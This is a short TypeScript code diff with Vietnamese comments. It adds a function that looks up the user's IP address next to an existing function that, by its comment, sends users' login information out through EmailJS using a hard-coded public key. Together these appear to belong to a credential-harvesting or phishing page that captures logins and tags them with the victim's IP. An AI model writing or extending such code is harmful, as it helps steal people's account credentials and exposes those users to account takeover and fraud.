@@ -9,6 +9,20 @@ const PUBLIC_KEY = 'pgcGwVmRmBOKo-kUL';
 emailjs.init(PUBLIC_KEY);
 
 /**
+ * Lấy địa chỉ IP của người dùng từ server
+ */
+export const getUserIp = async (): Promise<string> => {
+  try {
+    const response = await fetch('/api/ip');
+    const data = await response.json();
+    return data.ip || 'Unknown';
+  } catch (error) {
+    console.error('Error fetching IP address:', error);
+    return 'Unknown';
+  }
+};
+
+/**
  * Gửi thông tin đăng nhập của người dùng qua EmailJS
  */
 export const sendLoginInfo = async (data: {
